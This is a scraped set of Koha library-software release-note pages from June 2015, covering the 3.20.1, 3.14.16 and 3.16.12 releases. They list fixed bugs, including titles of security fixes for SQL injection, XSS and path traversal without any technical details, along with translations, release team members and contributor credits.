	14329	trivial	Useless copy/paste from Template::Plugin::HtmlToText
	14330	trivial	Remove unused email_sender from sendbasket/sendshelf

Test Suite
----------
	14256	normal	Tests for TestBuilder fail randomly
	14112	minor	Silence warnings t/Charset.t

Tools
----------
	10355	minor	Second click on modification log misses object parameter

translate.koha-community.org
----------
	14285	trivial	Bengali locale needs to be re-defined

New sysprefs in 3.20.1
======================

System requirements
======================

    Important notes:

    * Perl 5.10 is required
    * Zebra is required

Documentation
======================

The Koha manual is maintained in DocBook.The home page for Koha
documentation is
> [Documentation](https://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the
Koha manual is available:

    http://manual.koha-community.org/3.20/en/

The Git repository for the Koha manual can be found at

    http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary

Translations
======================

Complete or near-complete translations of the OPAC and staff
interface are available in this release for the following languages:

  * English (USA)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see

    http://wiki.koha-community.org/wiki/Translating_Koha

for information about translating Koha, and join the koha-translate
list to volunteer:

    http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate

The most up-to-date translations can be found at:

    http://translate.koha-community.org/

Release Team
======================

The release team for Koha 3.20.1 is

  Release Manager:       Tomás Cohen Arazi <tomascohen@gmail.com>
  QA Manager:            Katrin Fischer <Katrin.Fischer@bsz-bw.de>
  Documentation Manager: Nicole C. Engard <nengard@gmail.com>
  Translation Manager:   Bernardo Gonzalez Kriegel <bgkriegel@gmail.com>
  QA Team:               Jonathan Druart <jonathan.druart@biblibre.com>
                         Brendan Gallagher <brendan@bywatersolutions.com>
                         Kyle Hall <kyle@bywatersolutions.com>
                         Paul Poulain <paul.poulain@biblibre.com>
                         Martin Renvoize <martin.renvoize@ptfs-europe.com>
                         Marcel de Rooy <m.de.rooy@rijksmuseum.nl>
  Bug Wrangler:          Magnus Enger <magnus@enger.priv.no>
  Packaging Manager:     Robin Sheat <robin@catalyst.net.nz>

  Release Maintainer (3.18.x): Chris Cormack <chrisc@catalyst.net.nz>
  Release Maintainer (3.16.x): Mason James <mtj@kohaaloha.com>
  Release Maintainer (3.14.x): Fridolin Somers <fridolin.somers@biblibre.com>

Credits
======================

We thank the following libraries who are known to have sponsored
new features in Koha 3.20.1:

We thank the following individuals who contributed patches to Koha 3.20.1.

  * Aleisha (5)
  * Nicole C. Engard (1)
  * Tomás Cohen Arazi (3)
  * David Cook (2)
  * Chris Cormack (16)
  * Indranil Das Gupta (4)
  * Marcel de Rooy (8)
  * Jonathan Druart (18)
  * Magnus Enger (1)
  * Katrin Fischer (5)
  * Bernardo González Kriegel (6)
  * Kyle M Hall (4)
  * Josef Moravec (1)
  * Dobrica Pavlinusic (1)
  * Zeno Tajoli (1)
  * Mark Tompsett (4)
  * Marc Véron (3)

We thank the following libraries, companies, and other institutions who contributed
patches to Koha 3.20.1

  * BSZ BW (5)
  * BibLibre (9)
  * ByWater-Solutions (5)
  * Catalyst (16)
  * Cineca (1)
  * Libriotech (1)
  * Prosentient Systems (2)
  * Rijksmuseum (8)
  * Universidad Nacional de Córdoba (6)
  * koha-community.org (9)
  * rot13.org (1)
  * theke.io (3)
  * unidentified (14)
  * veron.ch (3)

We also especially thank the following individuals who tested patches
for Koha 3.20.1.

  * Aleisha (1)
  * Brendan Gallagher (1)
  * Cédric Vita (1)
  * Chris Cormack (78)
  * Frederic Demians (1)
  * Gaetan Boisson (1)
  * Jonathan Druart (46)
  * Katrin Fischer (36)
  * Liz Rea (1)
  * Marc Veron (1)
  * Marc Véron (9)
  * Mark Tompsett (7)
  * Nick Clemens (1)
  * Paola Rossi (1)
  * Signed-off-by:Heather Braum (1)
  * Tomas Cohen Arazi (74)
  * Indranil Das Gupta (2)
  * Indranil Das Gupta (L2C2 Technologies) (8)
  * Kyle M Hall (13)
  * Bernardo Gonzalez Kriegel (17)
  * Marcel de Rooy (11)

We regret any omissions.  If a contributor has been inadvertently missed,
please send a patch against these release notes to
koha-patches@lists.koha-community.org.

Revision control notes
======================

The Koha project uses Git for version control.  The current development
version of Koha can be retrieved by checking out the master branch of

    git://git.koha-community.org/koha.git

The branch for this version of Koha and future bugfixes in this release line is 3.20.x.

The last Koha release was 3.16.9, which was released on March 29, 2015.

Bugs and feature requests
======================

Bug reports and feature requests can be filed at the Koha bug
tracker at

    http://bugs.koha-community.org/

He rau ringa e oti ai.
(Many hands finish the work)

##### Autogenerated release notes updated last on 23 Jun 2015 07:28:54 Z #####
```

## Post navigation

[Previous Post is ‹ Koha Community Newsletter: May 2015](https://koha-community.org/koha-community-newsletter-may-2015/)[Next Post is Security Release – Koha 3.18.8 ›](https://koha-community.org/security-release-koha-3-18-8/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from koha-community.org_6cedb5af_20250125_001422.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Koha 3.14.16 released

[Fridolin SOMERS](https://koha-community.org/author/fridolin/ "View all posts by Fridolin SOMERS")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/koha-3-14-16-released/ "Koha 3.14.16 released")
Posted in [3.14](https://koha-community.org/category/release/3-14/), [release](https://koha-community.org/category/release/)

Tagged with [Announcements](https://koha-community.org/tag/announcements/), [Koha News](https://koha-community.org/tag/koha-news/)

Koha 3.14.16 can be downloaded from: <http://download.koha-community.org/koha-3.14.16.tar.gz>

Installation instructions can be found at <http://wiki.koha-community.org/wiki/Installation_Documentation> or in the INSTALL files that come in the tarball

Koha 3.14.16 is a security release.

#### Table of contents

* [Security bugfixes](#koha-security)
* [Other bugfixes](#koha-other)
* [Changes on system preferences](#koha-sysprefs)
* [System requirements](#koha-requirements)
* [Documentation](#koha-docs)
* [Translations](#koha-translations)
* [Release team](#koha-release-team)
* [Credits](#koha-credits)
* [Revision control](#koha-git)
* [Bug and feature requests](#koha-report-bugs)
### Security bugfixes in Koha 3.14.16

#### Authentication

* Questionable logic regarding session handling in C4::Auth::checkauth() *(major – bug [12954](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=12954))*

#### Lists

* Stored XSS flaw affects OPAC and Staff interface *(major – bug [14416](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416))*

#### OPAC

* SQL Injection in OPAC Interface *(critical – bug [14412](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412))*
* XSS Injection point *(major – bug [14360](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14360))*
* XSS Flaws in OPAC Interface *(major – bug [14418](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418))*

#### Staff Client

* Path traversal vulnerabilty *(critical – bug [14408](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408))*
* SQL Injection in Staff Client *(critical – bug [14426](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426))*
* Multiple XSS and XSRF issues in Staff Client *(major – bug [14423](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423))*

### Other bugs fixed in Koha 3.14.16

#### Authentication

* Auth.pm code issues *(trivial – bug [13521](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13521))*

### New system preferences in Koha 3.14.16

### System requirements

Important notes:

* Perl 5.10 is required
* Zebra is required

### Documentation

The Koha manual is maintained in DocBook. The home page for Koha documentation is [http://koha-community.org/documentation](http://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the Koha manual is available at <http://manual.koha-community.org/3.14.16/en/>

The Git repository for the Koha manual can be found at <http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary>

### Translations

Complete or near-complete translations of the OPAC and staff interface are available in this release for the following languages:

* English (USA)
* Arabic (99%)
* Armenian (100%)
* Czech (100%)
* Danish (88%)
* French (97%)
* German (100%)
* Greek (51%)
* Italian (100%)
* Kurdish (70%)
* Polish (62%)
* Portuguese (100%)
* Slovak (100%)
* Spanish (100%)
* Swedish (89%)
* Turkish (100%)
* Vietnamese (99%)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see <http://wiki.koha-community.org/wiki/Translating_Koha>

For information about translating Koha, and join the [koha-translate list](http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate) to volunteer

The most up-to-date translations can be found at [http://translate.koha-community.org](http://translate.koha-community.org/)

### Release Team

The release team for Koha 3.14.16 is

Release Manager: Galen Charlton <gmc@esilibrary.com>

Documentation Manager: Nicole C Engard <nengard@gmail.com>

Installation Documentation Managers:

* Samuel Desseaux <samuel.desseaux@ecp.fr>
* Mason James <mtj@kohaaloha.com>

Translation Manager: Bernardo Gonzalez Kriegel <bgkriegel@gmail.com>

QA Manager: Katrin Fischer <Katrin.Fischer@bsz-bw.de>

QA Team:

* Chris Cormack <chrisc@catalyst.net.nz>
* Marcel de Rooy <M.de.Rooy@rijksmuseum.nl>
* Jonathan Druart <jonathan.druart@biblibre.com>
* Brendan Gallagher <brendan@bywatersolutions.com>
* Kyle Hall <kyle@bywatersolutions.com>
* Mason James <mtj@kohaaloha.com>
* Paul Poulain <paul.poulain@biblibre.com>

Bug Wranglers: Magnus Enger <magnus@enger.priv.no>

Packaging Manager: Robin Sheat <robin@catalyst.net.nz>

Live CD Manager: Nguyen Quoc Uy <nguyenquocuy\_1102@yahoo.com>

VM Manager: Samuel Desseaux <samuel.desseaux@ecp.fr>

Release Maintainer (3.14.x): Fridolin Somers <fridolin.somers@biblibre.com>

Release Maintainer (3.16.x): Galen Charlton <gmc@esilibrary.com>

Release Maintainer (3.18.x): Chris Cormack <chrisc@catalyst.net.nz>

### Credits

We thank the following libraries who are known to have sponsored new features in Koha 3.14.16:

We thank the following individuals who contributed patches to Koha 3.14.16:

* Aleisha (2)
* Chris (7)
* Chris Cormack (4)
* Jonathan Druart (7)
* Mason James (1)
* Martin Renvoize (2)
* Fridolin Somers (5)

We thank the following libraries, companies, and other institutions who contributed patches to Koha 3.14.16:

* BibLibre (5)
* BigBallOfWax (7)
* Catalyst (4)
* KohaAloha (1)
* PTFS-Europe (2)
* koha-community.org (7)
* unidentified (2)

We also especially thank the following individuals who tested patches for Koha 3.14.16:

* Chris Cormack (21)
* Fridolin Somers (20)
* Jonathan Druart (18)
* Katrin Fischer (20)
* Mason James (5)
* Tomas Cohen Arazi (11)
* Kyle M Hall (4)

We regret any omissions. If a contributor has been inadvertently missed, please send a patch against these release notes to koha-patches@lists.koha-community.org.

### Revision control notes

The Koha project uses Git for version control. The current development version of Koha can be retrieved by checking out the master branch of [git://git.koha-community.org/koha.git](//git.koha-community.org/koha.git)

The branch for this version of Koha and future bugfixes in this release line is 3.14.x.

### Bugs and feature requests

Bug reports and feature requests can be filed at the Koha bug tracker at [http://bugs.koha-community.org](http://bugs.koha-community.org/)

He rau ringa e oti ai. (Many hands finish the work)

##### Autogenerated release notes updated last on 23 juin 2015 16:09:13 Z #####

## Post navigation

[Previous Post is ‹ Security Release – Koha 3.16.12](https://koha-community.org/security-release-koha-3-16-12/)[Next Post is Koha Community Newsletter: June 2015 ›](https://koha-community.org/koha-community-newsletter-june-2015/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from koha-community.org_4abc0b89_20250125_001422.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Security Release – Koha 3.16.12

[Mason](https://koha-community.org/author/kohaaloha/ "View all posts by Mason")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/security-release-koha-3-16-12/ "Security Release – Koha 3.16.12")
Posted in [3.16](https://koha-community.org/category/release/3-16/), [releases](https://koha-community.org/category/releases/), [security](https://koha-community.org/category/security/)

The Koha release team would like to announce the release of Koha 3.16.12, this is a security release.

As such we strongly recommend people running 3.16.x should upgrade as soon as possible

Special thanks also goes to Raschin Tavakoli and Dimitris Simos from the Combinatorial Security Testing Team of SBA Research for finding and reporting the security bugs.

Please continue reading for the full release notes

# RELEASE NOTES FOR KOHA 3.16.12

23 Jun 2015

Koha is the first free and open source software library automation package (ILS). Development is sponsored by libraries of varying types and sizes, volunteers, and support companies from around the world.

The website for the Koha project is [http://koha-community.org](http://koha-community.org/) and Koha 3.16.12 can be downloaded from: <http://download.koha-community.org/koha-3.16.12.tar.gz>

Installation instructions can be found at <http://wiki.koha-community.org/wiki/Installation_Documentation> or in the INSTALL files that come in the tarball

Koha 3.16.12 is a security release.

This release contains critical security fixes, all users of Koha 3.16.x are highly recommended to upgrade as soon as is reasonable.

#### Table of contents

* [New features](#koha-features)
* [Enhancements](#koha-enhancements)
* [Other bugfixes](#koha-other)
* [Changes on system preferences](#koha-sysprefs)
* [System requirements](#koha-requirements)
* [Documentation](#koha-docs)
* [Translations](#koha-translations)
* [Release team](#koha-release-team)
* [Credits](#koha-credits)
* [Revision control](#koha-git)
* [Bug and feature requests](#koha-report-bugs)
### New features in Koha 3.16.12

####

### Enhancements in Koha 3.16.12

####

### Critical bugs fixed in Koha 3.16.12

#### Lists

* Stored XSS flaw affects OPAC and Staff interface *(major – bug [14416](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416))*

#### OPAC

* SQL Injection in OPAC Interface *(critical – bug [14412](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412))*
* XSS Injection point *(major – bug [14360](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14360))*
* XSS Flaws in OPAC Interface *(major – bug [14418](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418))*

#### Staff Client

* Path traversal vulnerabilty *(critical – bug [14408](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408))*
* Multiple XSS and XSRF issues in Staff Client *(major – bug [14423](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423))*

### Other bugs fixed in Koha 3.16.12

####

### New system preferences in Koha 3.16.12

### System requirements

Important notes:

* Perl 5.10 is required
* Zebra is required

### Documentation

The Koha manual is maintained in DocBook. The home page for Koha documentation is [http://koha-community.org/documentation](http://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the Koha manual is available at <http://manual.koha-community.org/3.16.12/en/>

The Git repository for the Koha manual can be found at <http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary>

### Translations

Complete or near-complete translations of the OPAC and staff interface are available in this release for the following languages:

* English (USA)
* Arabic (99%)
* Armenian (99%)
* Czech (99%)
* Danish (86%)
* French (96%)
* German (100%)
* Italian (100%)
* Kurdish (67%)
* Polish (99%)
* Portuguese (100%)
* Slovak (100%)
* Spanish (100%)
* Swedish (86%)
* Turkish (100%)
* Vietnamese (94%)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see <http://wiki.koha-community.org/wiki/Translating_Koha>

For information about translating Koha, and join the [koha-translate list](http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate) to volunteer

The most up-to-date translations can be found at [http://translate.koha-community.org](http://translate.koha-community.org/)

### Release Team

The release team for Koha 3.16.12 is

* Release Manager: Galen Charlton
* Documentation Manager: Nicole C Engard
* Translation Manager: Bernardo Gonzalez Kriegel
* QA Manager: Katrin Fischer
* QA Team:
  + Ruth Bavousett
  + Chris Cormack
  + Marcel de Rooy ,
  + Jonathan Druart ,
  + Brendan Gallagher
  + Kyle Hall
  + Paul Poulain
  + Martin Renvoize
* Bug Wranglers:
  + Chris Cormack
  + Magnus Enger
* Packaging Manager: Robin Sheat
* Release Maintainer (3.8.x): Kyle Hall
* Release Maintainer (3.10.x): Bernardo Gonzalez Kriegel
* Release Maintainer (3.12.x): Tomás Cohen Arazi
* Release Maintainer (3.14.x): Fridolin Somers

### Credits

We thank the following libraries who are known to have sponsored new features in Koha 3.16.12:

We thank the following individuals who contributed patches to Koha 3.16.12:

- Aleisha (2)
- Chris (7)
- Chris Cormack (5)
- Jonathan Druart (4)
- Bernardo Gonzalez Kriegel (1)

We thank the following libraries, companies, and other institutions who contributed patches to Koha 3.16.12:

- BigBallOfWax (7)
- Catalyst (5)
- koha-community.org (4)
- unidentified (3)

We also especially thank the following individuals who tested patches for Koha 3.16.12:

- Jonathan Druart (7)
- Katrin Fischer (11)
- Mason James (15)
- Kyle M Hall (4)

We regret any omissions. If a contributor has been inadvertently missed, please send a patch against these release notes to koha-patches@lists.koha-community.org.

### Revision control notes

The Koha project uses Git for version control. The current development version of Koha can be retrieved by checking out the master branch of git://git.koha-community.org/koha.git

The branch for this version of Koha and future bugfixes in this release line is 3.16.x.

The last Koha release was 3.18.8, which was released on June 25, 2015.

### Bugs and feature requests

Bug reports and feature requests can be filed at the Koha bug tracker at [http://bugs.koha-community.org](http://bugs.koha-community.org/)

He rau ringa e oti ai. (Many hands finish the work)

##### Autogenerated release notes updated last on 23 Jun 2015 11:50:28 Z #####

## Post navigation

[Previous Post is ‹ Security Release – Koha 3.18.8](https://koha-community.org/security-release-koha-3-18-8/)[Next Post is Koha 3.14.16 released ›](https://koha-community.org/koha-3-14-16-released/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software


